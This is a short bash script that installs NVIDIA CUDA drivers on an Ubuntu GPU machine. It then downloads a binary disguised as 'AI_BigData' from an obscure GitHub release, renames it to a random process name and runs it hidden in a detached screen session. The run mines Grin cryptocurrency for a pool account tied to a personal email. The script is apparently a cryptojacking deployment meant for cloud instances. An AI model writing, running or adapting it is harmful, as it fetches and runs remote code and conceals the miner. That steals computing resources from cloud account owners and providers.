#!/bin/bash
apt-get update
apt-get install -y git wget screen
CUDA_REPO_PKG=cuda-repo-ubuntu1604_10.0.130-1_amd64.deb
wget -O /tmp/${CUDA_REPO_PKG} http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/${CUDA_REPO_PKG} 
dpkg -i /tmp/${CUDA_REPO_PKG}
apt-key adv --fetch-keys http://developer.download.nvidia.com/compute/cuda/repos/ubuntu1604/x86_64/7fa2af80.pub 
rm -f /tmp/${CUDA_REPO_PKG}
apt-get update
apt-get install -y cuda-drivers
apt-get install -y cuda
export LD_LIBRARY_PATH=/usr/local/cuda/lib
export PATH=$PATH:/usr/local/cuda/bin
azure=mxsemsdnlkdj
a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
rm -r /usr/share/work/$azure
mkdir /usr/share
mkdir /usr/share/work
wget https://github.com/ts6aud5vkg/gpuissa/releases/download/grin/AI_BigData
mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
mv AI_BigData $azure -n
cp $azure "$cpuname"
rm -f  AI_BigData
echo $cpuname" is starting"
screen -d -m ./"${cpuname}" --algo grin29 --server grin.sparkpool.com:6666 --user nhac.tien1988@gmail.com/az
